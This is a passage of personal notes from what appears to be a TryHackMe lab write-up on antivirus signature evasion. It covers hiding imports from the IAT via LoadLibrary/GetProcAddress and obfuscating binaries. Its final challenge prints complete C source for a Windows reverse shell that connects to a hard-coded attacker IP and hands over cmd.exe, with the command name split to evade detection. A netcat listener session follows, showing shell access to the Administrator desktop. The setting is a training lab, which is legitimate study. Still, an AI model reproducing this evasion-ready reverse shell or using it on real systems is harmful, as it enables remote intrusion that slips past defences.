// 2. Obtain the handle of the module the call address is present in 
HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
```

Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the LoadLibrary call. We can store this call by casting it along with the previously defined structure. Below is an example of the syntax required to obtain the API call.

```
// 3. Obtain the process address of the call
myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, "GetComputerNameA");
```

Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly, GetProcAddress and LoadLibraryA are still present in the IAT; although not a direct indicator it can lead to or reinforce suspicion; this problem can be solved using PIC (Position Independent Code). Modern agents will also hook specific functions and monitor kernel interactions; this can be solved using API unhooking.

Using the knowledge you have accrued throughout this task, obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.

```
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

Once sufficiently obfuscated, submit the snippet to the webserver at http://MACHINE_IP/challenge-2.html. The file name must be saved as challenge-2.exe. If correctly obfuscated a flag will appear in an alert pop-up.


What flag is found after uploading a properly obfuscated snippet?
You can compile your snippet using `x86_64-w64-mingw32-gcc challenge.c -o challenge-2.exe`

![[Pasted image 20220917141802.png]]

![[Pasted image 20220917141923.png]]

*THM{N0_1MP0r75_F0r_Y0U}*

### Putting It All Together 

As reiterated through both this room and Obfuscation Principles, no one method will be 100% effective or reliable.

To create a more effective and reliable methodology, we can combine several of the methods covered in this room and the previous.

When determining what order you want to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated?

Note: In general, You should run automated obfuscation or less specific obfuscation methods after specific signature breaking, however, you will not need those techniques for this challenge.

Taking these notes into consideration, modify the provided binary to meet the specifications below.

    No suspicious library calls present
    No leaked function or variable names
    File hash is different than the original hash
    Binary bypasses common anti-virus engines

Note: When considering library calls and leaked function, be conscious of the IAT table and strings of your binary.

![[Pasted image 20220917142118.png]]
![[Pasted image 20220917142146.png]]
Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or other C compiler. The file name must be saved as challenge.exe. Once compiled, submit the executable to the webserver at http://10.10.245.34/. If your payload satisfies the requirements listed, it will be ran and a beacon will be sent to the provided server IP and port.

Note: It is also essential to change the C2Server and C2Port variables in the provided payload or this challenge will not properly work and you will not receive a shell back. 

Note: When compiling with GCC you will need to add compiler options for winsock2 and ws2tcpip. These libraries can be included using the compiler flags -lwsock32 and -lws2_32

If you are still stuck we have provided a walkthrough of the solution below.


What is the flag found on the Administrator desktop?

```
┌──(kali㉿kali)-[~/obfus]
└─$ i686-w64-mingw32-gcc challenge.c -o challenge.exe
                                                                                               
┌──(kali㉿kali)-[~/obfus]
└─$ ls
challenge-1.ps1  challenge-2.exe  challenge-8.cpp  challenge.c  challenge.exe  flag1.ps
                                                                                               
┌──(kali㉿kali)-[~/obfus]
└─$ cat challenge.c    
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void Run(char* Server, int Port) {

HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 

        SOCKET s12;
        struct sockaddr_in addr;
        WSADATA version;
        myWSAStartup(MAKEWORD(2,2), &version);
        s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = myinet_addr(Server);
        addr.sin_port = myhtons(Port);

        if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            myclosesocket(s12);
            myWSACleanup();
        } else {
            
            char P1[] = "cm";
            char P2[] = "d.exe";
            char* P = strcat(P1, P2);
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12;
            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        Run(argv[1], port);
    }
    else {
        char host[] = "10.11.81.220";
        int port = 1234;
        Run(host, port);
    }
    return 0;
} 

┌──(kali㉿kali)-[~/obfus]
└─$ nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.58.30.
Ncat: Connection from 10.10.58.30:49682.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>cd ..
cd ..

C:\xampp>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
05/13/2020  05:58 PM    <DIR>          PerfLogs
06/06/2022  05:28 PM    <DIR>          Program Files
06/06/2022  05:28 PM    <DIR>          Program Files (x86)
03/17/2021  03:00 PM    <DIR>          Users
03/17/2021  02:59 PM    <DIR>          Windows
06/06/2022  05:45 PM    <DIR>          xampp
               0 File(s)              0 bytes
               7 Dir(s)  13,862,584,320 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

03/17/2021  03:00 PM    <DIR>          .
03/17/2021  03:00 PM    <DIR>          ..
08/22/2022  04:22 PM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  13,858,959,360 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>ldir
ldir
'ldir' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

08/26/2022  05:07 PM    <DIR>          .
08/26/2022  05:07 PM    <DIR>          ..
08/26/2022  05:08 PM               848 dump.ps1
06/06/2022  07:09 PM    <DIR>          dumpbin
06/07/2022  03:46 AM                36 flag.txt
               2 File(s)            884 bytes
               3 Dir(s)  13,858,852,864 bytes free

C:\Users\Administrator\Desktop>more flag.txt
more flag.txt
THM{08FU5C4710N_15 MY_10V3_14N6U463}


```

![[Pasted image 20220917153846.png]]

*THM{08FU5C4710N_15 MY_10V3_14N6U463}*


###  Conclusion 



Signature evasion can kick off the process of preparing a malicious application to evade cutting-edge solutions and detection measures.

In this room, we covered how to identify signatures and break various types of signatures.

The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.

At this point, you can begin understanding other more advanced detection measures or analysis techniques and continue improving your offensive tool craft.


Read the above and continue learning!



[[Obfuscation Principles]]